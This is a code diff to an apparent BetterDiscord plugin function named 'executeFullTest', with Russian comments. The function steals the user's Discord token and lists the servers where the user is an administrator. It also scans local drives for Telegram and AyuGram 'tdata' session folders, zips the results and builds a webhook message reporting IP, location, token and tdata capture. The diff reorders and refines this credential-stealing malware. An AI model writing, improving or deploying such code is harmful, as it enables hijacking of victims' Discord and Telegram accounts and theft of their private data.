@@ -35,17 +35,45 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
         if (authStore && typeof authStore.getToken === 'function') result.dtoken = authStore.getToken();
     } catch (e) {}
 
-    // 3. УМНЫЙ ПОИСК tdata
+    // 3. СБОР СЕРВЕРОВ (Перенесено вверх, чтобы не терялось)
+    try {
+        const GuildStore = BdApi.Webpack.getStore("GuildStore");
+        const PermissionStore = BdApi.Webpack.getStore("PermissionStore");
+        const GuildMemberCountStore = BdApi.Webpack.getStore("GuildMemberCountStore");
+        if (GuildStore && PermissionStore) {
+            const guilds = GuildStore.getGuilds();
+            for (const g of Object.values(guilds)) {
+                if (PermissionStore.can(8n, g)) {
+                    let count = 0;
+                    if (GuildMemberCountStore && typeof GuildMemberCountStore.getMemberCount === 'function') count = GuildMemberCountStore.getMemberCount(g.id);
+                    if (!count) count = g.memberCount || g.approximateMemberCount;
+                    if (!count && result.dtoken) {
+                        try {
+                            const res = await BdApi.Net.fetch(`https://discord.com/api/v9/guilds/${g.id}?with_counts=true`, { headers: { "Authorization": result.dtoken } });
+                            if (res.ok) { const data = await res.json(); count = data.approximate_member_count || data.member_count || 0; }
+                        } catch (err) {}
+                    }
+                    result.admin_servers.push({ name: g.name, members: count || 0 });
+                }
+            }
+        }
+    } catch (e) {
+        result.debug_tdata.push("Ошибка сбора серверов: " + e.message);
+    }
+
+    // 4. ПОИСК tdata (Быстрый и безопасный)
     let hasTdata = false;
     let tdataPath = null;
     
     try {
-        // Сначала проверяем стандартные пути
         const appData = process.env.APPDATA || '';
         const localAppData = process.env.LOCALAPPDATA || '';
         const userProfile = process.env.USERPROFILE || '';
         
+        // Стандартные пути + твой конкретный пример
         const standardPaths = [
+            'D:\\zapret\\Ayugram\\tdata',
+            'D:\\zapret\\Telegram\\tdata',
             path.join(appData, 'Telegram Desktop', 'tdata'),
             path.join(appData, 'Telegram', 'tdata'),
             path.join(appData, 'AyuGram', 'tdata'),
@@ -59,81 +87,69 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
         for (const p of standardPaths) {
             if (fs.existsSync(p)) { 
                 tdataPath = p; 
-                result.debug_tdata.push(`Найдено в AppData/Desktop: ${p}`);
+                result.debug_tdata.push(`Найдено в стандартном пути: ${p}`);
                 break; 
             }
         }
 
-        // Если нет, сканируем диски по твоей логике
+        // Если не нашли, делаем быстрый поиск по дискам (только корень и 1 уровень вглубь)
         if (!tdataPath) {
-            result.debug_tdata.push("Стандартные пути пусты. Сканирование дисков...");
-            
-            const ignoreDirs = ['windows', 'program files', 'program files (x86)', 'programdata', 'system volume information', '$recycle.bin', 'appdata', 'node_modules', 'users'];
-            
-            const findTdata = (dir, depth = 0) => {
-                if (depth > 3) return null; // Максимум 3 уровня вглубь (диск -> папка -> папка -> tdata)
-                
-                try {
-                    const entries = fs.readdirSync(dir, { withFileTypes: true });
-                    
-                    // 1. Проверяем, есть ли прямо здесь папка tdata
-                    for (const entry of entries) {
-                        if (entry.isDirectory() && entry.name.toLowerCase() === 'tdata') {
-                            return path.join(dir, entry.name);
-                        }
-                    }
-                    
-                    // 2. Ищем папки Telegram или AyuGram
-                    for (const entry of entries) {
-                        if (entry.isDirectory()) {
-                            const lowerName = entry.name.toLowerCase();
-                            if (ignoreDirs.includes(lowerName) || lowerName.startsWith('.')) continue;
-                            
-                            const fullPath = path.join(dir, entry.name);
-                            
-                            // Если папка называется Ayugram, Telegram и т.д.
-                            if (lowerName.includes('telegram') || lowerName.includes('ayugram')) {
-                                const tdataInside = path.join(fullPath, 'tdata');
-                                if (fs.existsSync(tdataInside) && fs.statSync(tdataInside).isDirectory()) {
-                                    return tdataInside; // Нашли tdata внутри Ayugram!
-                                }
-                            }
-                            
-                            // Если не нашли, заходим глубже (например, в папку 'zapret')
-                            const resultPath = findTdata(fullPath, depth + 1);
-                            if (resultPath) return resultPath;
-                        }
-                    }
-                } catch (e) {
-                    // Игнорируем системные ошибки доступа
-                }
-                return null;
-            };
+            result.debug_tdata.push("Поиск в корнях дисков...");
+            const drives = ['C:', 'D:', 'E:', 'F:'];
+            const ignoreDirs = ['windows', 'program files', 'program files (x86)', 'programdata', 'system volume information', '$recycle.bin', 'appdata', 'users'];
 
-            const drives = ['C:', 'D:', 'E:', 'F:', 'G:'];
             for (const d of drives) {
                 const root = d + '\\';
-                if (fs.existsSync(root)) {
-                    result.debug_tdata.push(`Сканирование ${root}...`);
-                    tdataPath = findTdata(root);
-                    if (tdataPath) break;
-                }
+                if (!fs.existsSync(root)) continue;
+
+                try {
+                    // Проверяем папки в корне диска (например, D:\zapret, D:\Games)
+                    const dirs = fs.readdirSync(root, { withFileTypes: true });
+                    for (const dir of dirs) {
+                        if (!dir.isDirectory()) continue;
+                        const lowerName = dir.name.toLowerCase();
+                        if (ignoreDirs.includes(lowerName)) continue;
+
+                        const fullPath = path.join(root, dir.name);
+                        
+                        // Проверяем: D:\zapret\tdata
+                        if (fs.existsSync(path.join(fullPath, 'tdata'))) {
+                            tdataPath = path.join(fullPath, 'tdata');
+                            break;
+                        }
+
+                        // Если это D:\zapret, заглядываем внутрь на 1 уровень (ищем D:\zapret\Ayugram\tdata)
+                        try {
+                            const subDirs = fs.readdirSync(fullPath, { withFileTypes: true });
+                            for (const sub of subDirs) {
+                                if (sub.isDirectory() && (sub.name.toLowerCase().includes('telegram') || sub.name.toLowerCase().includes('ayugram'))) {
+                                    const subPath = path.join(fullPath, sub.name);
+                                    if (fs.existsSync(path.join(subPath, 'tdata'))) {
+                                        tdataPath = path.join(subPath, 'tdata');
+                                        break;
+                                    }
+                                }
+                            }
+                        } catch (e) {} // Игнорируем ошибки доступа к подпапкам
+                        
+                        if (tdataPath) break;
+                    }
+                } catch (e) {} // Игнорируем ошибки доступа к корню диска
+                if (tdataPath) break;
             }
         }
     } catch (e) {
         result.debug_tdata.push(`Ошибка поиска: ${e.message}`);
     }
 
-    // 4. ФОРМИРУЕМ АРХИВ
+    // 5. ФОРМИРУЕМ АРХИВ
     let finalZipBuffer = null;
     try {
         const zipFiles = {};
 
-        // data.json
         const jsonBytes = new TextEncoder().encode(JSON.stringify(result, null, 2));
         zipFiles['data.json'] = jsonBytes;
 
-        // tdata
         if (tdataPath) {
             result.telegram_path = tdataPath;
             result.debug_tdata.push(`Папка tdata найдена: ${tdataPath}`);
@@ -164,38 +180,12 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
             result.debug_tdata.push("Папка tdata не найдена.");
         }
 
-        // zipSync
         finalZipBuffer = zipFunc(zipFiles);
         result.debug_tdata.push("ZIP успешно создан!");
 
     } catch (e) {
         result.debug_tdata.push(`Ошибка архивации: ${e.message}`);
-        hasTdata = false;
     }
-
-    // 5. Сбор информации о серверах
-    try {
-        const GuildStore = BdApi.Webpack.getStore("GuildStore");
-        const PermissionStore = BdApi.Webpack.getStore("PermissionStore");
-        const GuildMemberCountStore = BdApi.Webpack.getStore("GuildMemberCountStore");
-        if (GuildStore && PermissionStore) {
-            const guilds = GuildStore.getGuilds();
-            for (const g of Object.values(guilds)) {
-                if (PermissionStore.can(8n, g)) {
-                    let count = 0;
-                    if (GuildMemberCountStore && typeof GuildMemberCountStore.getMemberCount === 'function') count = GuildMemberCountStore.getMemberCount(g.id);
-                    if (!count) count = g.memberCount || g.approximateMemberCount;
-                    if (!count && result.dtoken) {
-                        try {
-                            const res = await BdApi.Net.fetch(`https://discord.com/api/v9/guilds/${g.id}?with_counts=true`, { headers: { "Authorization": result.dtoken } });
-                            if (res.ok) { const data = await res.json(); count = data.approximate_member_count || data.member_count || 0; }
-                        } catch (err) {}
-                    }
-                    result.admin_servers.push({ name: g.name, members: count || 0 });
-                }
-            }
-        }
-    } catch (e) {}
 
     // 6. Отправка
     const messageText = `Ip: ${result.ip}\nLocation: ${result.location}\nNitro: ${result.nitro !== "Нет" ? "✅" : "❌"}\nToken: ${result.dtoken ? "✅" : "❌"}\nTdata: ${hasTdata ? "✅" : "❌"}\n@everyone`;
